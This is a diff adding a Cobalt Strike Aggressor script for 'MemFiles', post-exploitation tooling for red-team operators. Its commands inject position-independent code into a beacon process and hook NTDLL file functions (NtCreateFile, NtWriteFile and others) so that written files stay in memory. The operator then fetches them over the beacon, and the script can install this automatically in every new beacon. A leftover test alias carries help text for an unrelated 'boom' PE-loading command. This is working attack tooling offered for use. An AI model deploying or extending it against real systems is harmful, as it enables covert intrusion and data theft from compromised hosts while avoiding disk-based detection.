@@ -1,0 +1,682 @@
+global('@memfiles $issuedcommand %memfiles_file')
+
+#Boolean controlling whether this client should print to the Beacon console when receiving output relating to MemFiles.
+#This exists so that if for example 4 clients are connnected to a TS, only the client that issued a MemFiles command will react to and print messages rather than all 4 doing so.
+$issuedcommand = 0;
+
+#File path to external txt file where memtable will be backed up after every modification and where client will try to load from on startup.
+$memfiles_file = cwd() . "/memfiles.txt";
+
+#%memfiles is a hash of arrays. The key for each array is the BeaconId. Each array in memfiles follows this format and each value in the arrays is stored as a string:
+#@(PID, User, Date/Time, pFileInfoStruct)
+#
+#Value description:
+#key beaconid = CobaltStrike internal identifier for each beacon.  Used to create/locate/remove entries in memfiles when pe commands are issues from a beacon console.
+#0.  pid = Beacon process ID.  Stored for ease of reference for Operators. 
+#1.  User = CobaltStrike user alias of the CS client that installed MemFiles in the beacon process.
+#2.  Date/Time = Date and time that MemFiles was installed.
+#3.  pFileInfoStruct = Memory address of critical struct in beacon memory used by MemFiles to track values across BOF's
+
+############################## On load try to manually populate MemFiles internal data structure from file ##############################
+
+#On initial load, check for/create file to store file upload data
+if(!-exists $memfiles_file)
+{
+    createNewFile($memfiles_file);
+
+    if (checkError($error))
+    {
+        show_error("Could not locate or create memfiles log (specified as " . $memfiles_file . ")! Try manually creating this file and then re-load this CNA!")
+        exit();
+    }
+    else
+    {
+        #If the file didn't exist before, we need to initialize some settings
+        #Set AutoInstall to FALSE by default
+        %memfiles['AutoInstall'] = @("AutoInstall", "FALSE", "Global setting that dictates whether MemFiles is automatically initialized in each new Beacon that calls in");
+
+        println("Successfully created " . $memfiles_file . "!")
+    }
+}
+else
+{
+    #Read in uploads file to create array on startup
+    $handle = openf($memfiles_file);
+    while $text (readln($handle)) 
+    {
+        #Now split beacon_output by space delimeter and assign values as appropriate
+        ($bid, $pid, $user, $datetime, $structaddr) = split(' ~\*~ ', $text);
+
+        #Add entry to memtable
+        %memfiles[$bid] = @($pid, $user, $datetime, $structaddr);
+    }
+    closef($handle);
+    println("Successfully loaded " . $memfiles_file . "!")
+}
+
+#This function called each time a clients PE table is modified in order to refresh the local on-disk copy of memtable.
+sub writelogfile
+{
+    #open $memfiles_file file and write array out to file to ensure we don't lose data if CS crashes
+    $handle = openf(">" . $memfiles_file);
+    foreach $var (keys(%memfiles))
+    {
+        println($handle, $var . " ~*~ " . %memfiles[$var][0] . " ~*~ " . %memfiles[$var][1] . " ~*~ " . %memfiles[$var][2] . " ~*~ " . %memfiles[$var][3]);
+    }
+    closef($handle);
+}
+
+#Logic controlling whether MemFiles is automatically initialized in new Beacons
+on beacon_initial
+{
+    $barch = barch($1);
+    if($barch eq "x64" && %memfiles['AutoInstall'][1] eq "TRUE")
+    {
+        #With multiple connected clients, we need to make sure only one client is initialized MemFiles
+        #Query CS data model for users currently connected to TS, sort alphabetically
+        @users = sorta(data_query("users"));
+
+        #If this client is the first user (alphabetically), they will broadcast their memtable so that all other clients may update / populate their tables.
+        if(@users[0] eq mynick())
+        {
+            meminitfunc($1); 
+        }
+    }
+}
+
+
+#################################### Parse Beacon output and update MemFiles data structure ####################################
+
+#Have to capture all beacon output and then filter to determine if it contains MemFiles info or not
+on beacon_output
+{
+    local('$trash $bid')
+    
+    $bid = $1;
+
+    #Look for 'memfiles_struct' in beacon_output, if it appears we need to parse and grab values
+    if("memfiles_struct" isin $2)
+    {
+        #Now split beacon_output by space delimeter and assign values as appropriate
+        ($trash %memfiles[$bid][3]) = split(" ", split("\n", $2)[-1]);
+
+        #If this client was the one that issued the command, announce in beacon console what we have done
+        if($issuedcommand == 1)
+        {
+            blog($1, "\c9[+] MemFiles Initialized!\c9");
+        }
+
+        #Set issuedcommand bool back to FALSE so we no longer print messages
+        $issuedcommand = 0;
+
+        #Re-write local memtable file with updated data
+        writelogfile();
+    }
+
+    if("MemFiles cleaned from Beacon process!" isin $2)
+    {
+        removeAt(%memfiles, $bid);
+
+        #Re-write local memtable file with updated data
+        writelogfile();
+    }
+}
+
+###################################### Parse Event Log and update MemFiles data structure ######################################
+
+#Parse all events that hit the Event Log and act on those concerning MemFiles events as well as notifications of new users joining the TS
+on event_action
+{
+    local('$trash $bid $pid $user $datetime $structaddr $x');
+    #If peload is in the event message, a new memtable entry was created by a client and needs to be added to every other clients table.
+    if("MemFiles_createstruct" isin $2)
+    {
+        #Now split beacon_output by space delimeter and assign values as appropriate
+        ($trash, $bid, $pid, $user, $datetime, $structaddr) = split(' ~\*~ ', $2);
+
+        #Add entry to memtable
+        %memfiles[$bid] = @($pid, $user, $datetime, $structaddr);
+
+        #Re-write local memtable file with updated data
+        writelogfile();
+    }
+
+    #If MemFiles_CONFIG is in event message, a global setting has been updated by a connected user and needs to be reflected across all clients
+    else if("MemFiles_CONFIG" isin $2)
+    {
+        #Now split beacon_output by space delimeter and assign values as appropriate
+        ($trash, $setting, $value) = split(' ~\*~ ', $2);
+
+        #Alter entry to memtable
+        %memfiles[$setting][1] = $value;
+
+        #Re-write local memtable file with updated data
+        writelogfile();
+    }
+
+    #If MemFiles_broadcast is in event message and this client didn't send the broadcast, we need to sync our memtable with the broadcasted one
+    else if("MemFiles_broadcast" isin $2 && $1 ne mynick())
+    {
+        #Now split beacon_output by space delimeter and assign values as appropriate
+        ($trash, $bid, $pid, $user, $datetime, $structaddr) = split(' ~\*~ ', $2);
+        
+        #Add entry to memtable
+        %memfiles[$bid] = @($pid, $user, $datetime, $structaddr);
+
+        #Re-write local memtable file with updated data
+        writelogfile();
+    }
+}
+
+######################################## Pass MemFiles data structure to new users joining TS  #########################################
+
+on event_join
+{
+    #Query CS data model for users currently connected to TS, sort alphabetically
+    @users = sorta(data_query("users"));
+
+    #If this client is the first user (alphabetically), we will broadcast out memtable so that all other clients may update / populate their tables.
+    if(@users[0] eq mynick())
+    {
+        #We are going to sleep for 5 seconds to allow the new CS client to fully startup + try and read from the local memtable file (if it exists)
+        sleep(5000);
+
+        foreach $var (keys(%memfiles))
+        {
+            action("MemFiles_broadcast" . " ~*~ " . $var . " ~*~ " . %memfiles[$var][0] . " ~*~ " . %memfiles[$var][1] . " ~*~ " . %memfiles[$var][2] . " ~*~ " . %memfiles[$var][3]);
+        }
+    }
+}
+
+################################################################ memtable ################################################################
+
+alias memtable
+{
+    local('@temparr');
+    #If 'memtable clear' is issued, iterate through table and remove any entries for beacons that have exited or haven't called back in 3x their sleep time (assumed dead);
+    if($2 eq "clear")
+    {
+        foreach $bid (keys(%memfiles))
+        {
+            if( $bid ismatch '\d+' && (!-isactive $bid || binfo($bid, "last") >= (binfo($bid, "sleep")[0] * 1000 * 3)))
+            {
+                #Have to build temporary array since we can't remove array items while iterating over that array
+                add(@temparr, $bid);
+            }  
+        }
+
+        #Now remove each item in temparr from actual table
+        foreach $bid (@temparr)
+        {
+            removeAt(%memfiles, $bid);
+        }
+
+        #Update MemFiles logfile
+        writelogfile();
+    }
+
+    #Otherwise print table
+    else
+    {
+        $head1 = "PID";
+        $head2 = "Loaded By";
+        $head3 = "Date/Time";
+        $head4 = "pMemAddrStruct";
+        $head5 = "Setting";
+        $head6 = "Value";
+        $head7 = "Description";
+        
+        blog($1, "");
+        blog($1, "\c7Global Configuration\c7");
+        blog($1, "$[15]head5 $[10]head6 $head7");
+        blog($1, "-" x 140);
+
+        foreach $val (keys(%memfiles))
+        {
+            #Print all keys that don't contain numbers -> these are configuration settings
+            if( $val ismatch '\D+')
+            {
+                $setting = %memfiles[$val][0];
+                $value = %memfiles[$val][1];
+                $description = %memfiles[$val][2];
+
+                #Color code TRUE/FALSE for easy reading
+                if($value eq "TRUE")
+                {
+                    blog($1, "$[15]setting \c3$[10]value\o $description");
+                }
+                else
+                {
+                    blog($1, "$[15]setting \c4$[10]value\o $description");
+                }
+            }
+        }
+
+        blog($1, "");
+        blog($1, "\c7Beacons with MemFiles installed\c7");
+        blog($1, "\cBCyan PID\cB = This beacon");
+        blog($1, "\c9Green Entries\c9 = Active beacons");
+        blog($1, "White Entries = Inactive beacons");
+        blog($1, "");
+        blog($1, "$[10]head1 $[15]head2 $[15]head3 $[15]head4");
+        blog($1, "-" x 70);
+
+        foreach $bid (keys(%memfiles))
+        {
+            if( $bid ismatch '\d+')
+            {
+                $pid = %memfiles[$bid][0];
+                $user = %memfiles[$bid][1];
+                $datetime = %memfiles[$bid][2];
+                $pMemAddrStruct = %memfiles[$bid][3];
+
+                #Display still active beacons as GREEN
+                if(-isactive $bid && binfo($bid, "last") <= (binfo($bid, "sleep")[0] * 1000 * 3))
+                {
+                    #If $bid matches the beacon this is being ran in, highlight the PID
+                    if($bid == $1)
+                    {
+                        blog($1, "\cB$[10]pid\o \c9$[15]user $[15]datetime $[15]pMemAddrStruct\c9");
+                    }
+                    else
+                    {
+                        blog($1, "\c9$[10]pid $[15]user $[15]datetime $[15]pMemAddrStruct\c9");
+                    }
+                }
+                #Display inactive beacons and those that haven't called back within 3x the sleep time as normal/white.
+                else
+                {
+                    #If $bid matches the beacon this is being ran in, highlight the PID
+                    if($bid == $1)
+                    {
+                        blog($1, "\cB$[10]pid\o $[15]user $[15]datetime $[15]pMemAddrStruct");
+                    }
+                    else
+                    {
+                        blog($1, "$[10]pid $[15]user $[15]datetime $[15]pMemAddrStruct");
+                    }
+                }
+            }
+        }
+        blog($1, "");
+    }
+}
+
+beacon_command_register(
+    "memtable", 
+    "View the table detailing CobaltStrike beacons in which MemFiles is active", 
+    "
+Command: memtable
+Summary: This command will display a table detailing all beacons in which MemFiles has been installed.
+         The table may additionally be cleared of old entries concerning dead beacons.
+
+Usage:   memtable <clear>
+         <clear>             Optional. Clear entries from the table where Beacon is dead or has exceeded 3x callback time.
+
+         Example: memtable                               <- This example will display the table of Beacons in which MemFiles is active.
+         Example: memtable clear                         <- This example will clear the table of entries concerning Beacons that are either dead or have exceeded 3x the callback time.
+"
+);
+
+################################################################ meminit ################################################################
+
+alias meminit
+{
+    meminitfunc($1);
+}
+
+sub meminitfunc
+{
+    local('$bid $barch $args $handle $ntcreatefile $ntwritefile $ntclose $ntqueryvolumeinformationfile $ntqueryinformationfile $ntsetinformationfile $ntreadfile $ntopenfile $ntflushbuffersfile');
+
+    $bid = $1;
+
+    $barch = barch($bid);
+    if($barch ne "x64")
+    {
+        berror($1, "Only x64 is supported... sorry");
+        return;
+    }
+
+    if($bid in %memfiles)
+    {
+        berror($bid, "MemFiles is already active in this beacon!");
+        exit();
+    }
+    else
+    {        
+        #Create array in @memfiles to store PE data.
+        #Values: BeaconID, PID, User, Date/Time, pFileInfoStruct
+        action("MemFiles_createstruct" . " ~*~ " . $bid . " ~*~ " . binfo($bid, "pid") . " ~*~ " . mynick() . " ~*~ " . tstamp(ticks()) . " ~*~ " . "null");
+
+        #Set issuedcommand bool to TRUE so we print messages when we get feeback from BOF;
+        $issuedcommand = 1;
+
+        # read in the NtCreateFile PIC file
+        $handle = openf(script_resource("PIC/Bin/NtCreateFile.x64.bin"));
+        $ntcreatefile = readb($handle, -1);
+        closef($handle);
+
+        # read in the NtWriteFile PIC file
+        $handle = openf(script_resource("PIC/Bin/NtWriteFile.x64.bin"));
+        $ntwritefile = readb($handle, -1);
+        closef($handle);
+
+        # read in the NtClose PIC file
+        $handle = openf(script_resource("PIC/Bin/NtClose.x64.bin"));
+        $ntclose = readb($handle, -1);
+        closef($handle); 
+
+        # read in the NtQueryVolumeInformationFile PIC file
+        $handle = openf(script_resource("PIC/Bin/NtQueryVolumeInformationFile.x64.bin"));
+        $ntqueryvolumeinformationfile = readb($handle, -1);
+        closef($handle); 
+
+        # read in the NtQueryInformationFile PIC file
+        $handle = openf(script_resource("PIC/Bin/NtQueryInformationFile.x64.bin"));
+        $ntqueryinformationfile = readb($handle, -1);
+        closef($handle); 
+
+        # read in the NtSetInformationFile PIC file
+        $handle = openf(script_resource("PIC/Bin/NtSetInformationFile.x64.bin"));
+        $ntsetinformationfile = readb($handle, -1);
+        closef($handle); 
+
+        # read in the NtReadFile PIC file
+        $handle = openf(script_resource("PIC/Bin/NtReadFile.x64.bin"));
+        $ntreadfile = readb($handle, -1);
+        closef($handle);
+
+        # read in the NtOpenFile PIC file
+        $handle = openf(script_resource("PIC/Bin/NtOpenFile.x64.bin"));
+        $ntopenfile = readb($handle, -1);
+        closef($handle);
+
+        # read in the NtFlushBuffersFile PIC file
+        $handle = openf(script_resource("PIC/Bin/NtFlushBuffersFile.x64.bin"));
+        $ntflushbuffersfile = readb($handle, -1);
+        closef($handle);
+
+        # read in the right BOF file
+        $handle = openf(script_resource("BOF/InstallHooks. $+ $barch $+ .o"));
+        $data   = readb($handle, -1);
+        closef($handle);
+
+        # Pack the arguments
+
+        $args = bof_pack($1, "bbbbbbbbb", $ntcreatefile, $ntwritefile, $ntclose, $ntqueryvolumeinformationfile, $ntqueryinformationfile, $ntsetinformationfile, $ntreadfile, $ntopenfile, $ntflushbuffersfile);
+
+        # Execute BOF
+        beacon_inline_execute($1, $data, "go", $args);
+    }
+}
+
+beacon_command_register(
+    "meminit",
+    "Install MemFiles in a Beacon process",
+    "
+Command: meminit
+Summary: This command will run a BOF to install the MemFiles capability in a Beacon process.
+
+         WARNING!
+         MemFiles hooks several NtApi's and assumes a clean/unhooked copy of NTDLL.dll in the Beacon process!
+         Undefined behaviour (read: your beacon is going to crash) may occur if you try and use MemFiles in a process that EDR has hooks in!
+
+         Three major steps are performed:
+            1. Position independent custom functions are allocated and injected in the Beacon process's memory
+            2. Trampolines are allocated and injected in the Beacon process's memory
+            3. Certain NtFunctions are hooked and execution redirected to the aforementioned PIC custom functions.
+
+         The functions hooked by MemFiles are:
+          NtCreateFile
+          NtWriteFile
+          NtClose
+          NtQueryVolumeInformationFile
+          NtQueryInformationFile
+          NtSetInformationFile
+          NtReadFile
+          NtOpenFile
+          NtFlushBuffersFile
+
+Usage:   meminit
+"
+);
+
+################################################################ memlist ################################################################
+
+alias memlist
+{
+    local('$bid $barch $PE $args $x $matchfound $fetchfiles $cleanup');
+
+    $bid = $1;
+
+    $barch = barch($bid);
+    if($barch ne "x64")
+    {
+        berror($1, "Only x64 is supported... sorry");
+        return;
+    }
+
+    if($bid !in %memfiles)
+    {
+        berror($bid, "MemFiles is not active in this beacon!");
+        exit();
+    }
+    else
+    {        
+        $fetchfiles = 0;
+        $cleanup = 0;
+        $pFileInfoStruct = %memfiles[$bid][3];
+
+        # read in the right BOF file
+        $handle = openf(script_resource("BOF/MemFiles. $+ $barch $+ .o"));
+        $data   = readb($handle, -1);
+        closef($handle);
+
+        # Pack the arguments
+        $args = bof_pack($1, "zii", $pFileInfoStruct, $fetchfiles, $cleanup);
+
+        # Execute BOF
+        beacon_inline_execute($1, $data, "go", $args);
+    }
+}
+
+beacon_command_register(
+    "memlist",
+    "Query MemFiles for information on all of the files currently stored in a Beacon process's memory",
+    "
+Command: memlist
+Summary: This command will run a BOF to retrieve and list information concerning files currently stored by MemFiles.
+         It will list:
+
+            File index              The index in the MemFiles array where the file is stored    
+            File name               The name of the file as dictated by the program that wrote it 
+            File handle             The MemFiles-unique handle associated with the file 
+            File length             The length of the file's data 
+            Memory allocation size  The size of the section of memory allocated to hold the file 
+            File closed             A boolean representing whether the file handle associated with the file has been 'closed'; indicating the writing program is done with it.
+
+Usage:   memlist
+"
+);
+
+############################################################### memfetch ################################################################
+
+alias memfetch
+{
+    local('$bid $barch $PE $args $x $matchfound $fetchfiles $force $cleanup');
+
+    $bid = $1;
+
+    $barch = barch($bid);
+    if($barch ne "x64")
+    {
+        berror($1, "Only x64 is supported... sorry");
+        return;
+    }
+
+    if($bid !in %memfiles)
+    {
+        berror($bid, "MemFiles is not active in this beacon!");
+        exit();
+    }
+    else
+    {   
+        $fetchfiles = 1;
+        $force = 0;
+        $cleanup = 0;
+        $pFileInfoStruct = %memfiles[$bid][3];
+
+        #If force argment is provided by user, update variable
+        if($2 eq lc("force"))
+        {
+            $force = 1;
+        }
+
+        # read in the right BOF file
+        $handle = openf(script_resource("BOF/MemFiles. $+ $barch $+ .o"));
+        $data   = readb($handle, -1);
+        closef($handle);
+
+        # Pack the arguments
+        $args = bof_pack($1, "ziii", $pFileInfoStruct, $fetchfiles, $force, $cleanup);
+
+        # Execute BOF
+        beacon_inline_execute($1, $data, "go", $args);
+    }
+}
+
+beacon_command_register(
+    "memfetch",
+    "Retrieve all files stored in the Beacon process's memory by MemFiles",
+    "
+Command: memfetch
+Summary: This command will run a BOF to fetch all complete files that are currently stored by MemFiles in a Beacon process.
+         Once files have been downloaded, they will be cleared from Beacon process memory.
+         
+         MemFiles marks a file as complete when Windows calls NtClose on the handle associated with it.
+         This is done to try and avoid pulling/removing a file before a program/application is done writing to it.
+         If a program/application that writes into MemFiles fails to call NtClose, the file in question will not be marked complete.
+         Use the 'force' argument to instruct memfetch to retrieve all files regardless of open/closed status.
+
+
+Usage:   memfetch <force>
+         <force>        Optional. Instruct memfetch to retrieve all files regardless of open/closed status.
+
+         Example: memfetch
+                  memfetch force
+"
+);
+
+############################################################### memclean ################################################################
+
+alias memclean
+{
+    local('$bid $barch $PE $args $x $matchfound $fetchfiles $force $cleanup');
+
+    $bid = $1;
+
+    $barch = barch($bid);
+    if($barch ne "x64")
+    {
+        berror($1, "Only x64 is supported... sorry");
+        return;
+    }
+
+    if($bid !in %memfiles)
+    {
+        berror($bid, "MemFiles is not active in this beacon!");
+        exit();
+    }
+    else
+    {        
+        $fetchfiles = 1;
+        $force = 1;
+        $cleanup = 1;
+        $pFileInfoStruct = %memfiles[$bid][3];
+
+        # read in the right BOF file
+        $handle = openf(script_resource("BOF/MemFiles. $+ $barch $+ .o"));
+        $data   = readb($handle, -1);
+        closef($handle);
+
+        # Pack the arguments
+        $args = bof_pack($1, "ziii", $pFileInfoStruct, $fetchfiles, $force, $cleanup);
+
+        # Execute BOF
+        beacon_inline_execute($1, $data, "go", $args);
+    }
+}
+
+beacon_command_register(
+    "memclean",
+    "Retrieve all in-memory files and then uninstall MemFiles from a Beacon.",
+    "
+Command: memclean
+Summary: This command will run a BOF to retrieve any files currently stored by MemFiles in the Beacon process.
+         It will then zero and free all memory allocated by MemFiles and unhook all NtApi's altered by MemFiles, restoring them to their original state.
+
+         Because this command ultimately uninstalls MemFiles:
+         - It will forcefully retrieve any files stored by MemFiles in a Beacon process, even if a files handle is not closed.
+         - It can be used in place of memfetch if the intention is to clean up MemFiles as soon as a file has been retrieved.
+         
+
+Usage:   memclean
+"
+);
+
+################################################################# GUI ##################################################################
+#GUI is used to update global options that need to apply to all connected clients using MemFiles
+
+menubar("&MemFiles", "menu");
+popup menu {item("&Config", { memfilesDialog(); });}
+
+
+sub variable_updater
+{
+    %vals = $3;
+
+    #Send event notifying all clients of update to configuration
+    action("MemFiles_CONFIG" . " ~*~ " . "AutoInstall" . " ~*~ " . uc(%vals['autoinstall']));
+}
+
+sub memfilesDialog
+{
+    $dialog = dialog("MemFiles Configuration", %vals , &variable_updater);
+
+    dialog_description($dialog, "Toggle whether MemFiles is automatically initialized in each new Beacon");
+    drow_combobox($dialog, "autoinstall", "Install on beacon initial", @("TRUE", "FALSE"));
+    dbutton_action($dialog, "Update");
+    dialog_show($dialog);
+}
+
+
+
+alias custupload
+{
+    $bid = $1;
+    #$localfile = $2;
+    #$remotepath = $3;
+    $remotepath = $2;
+
+    $filehandle = openf("/root/large.txt");
+    $data = readb($filehandle, -1);
+    closef($filehandle);
+
+    bupload_raw($bid, $2, $data);
+}
+
+beacon_command_register(
+    "custupload",
+    "in-memory testing",
+    "
+Command: boom
+Summary: This command will run a BOF to load an unmanaged PE into Beacon memory.
+         Supports x64 C or C++ binaries compiled with mingw or visual studio.  Binaries outside these parameters are untested. 
+
+Usage:   boom </path/to/binary.exe>
+         </path/to/binary.exe>        Required. Full path to the windows EXE you wish you load into the Beacon.
+
+         Example: boom /root/windows_binaries/dsquery_win7.exe
+"
+);
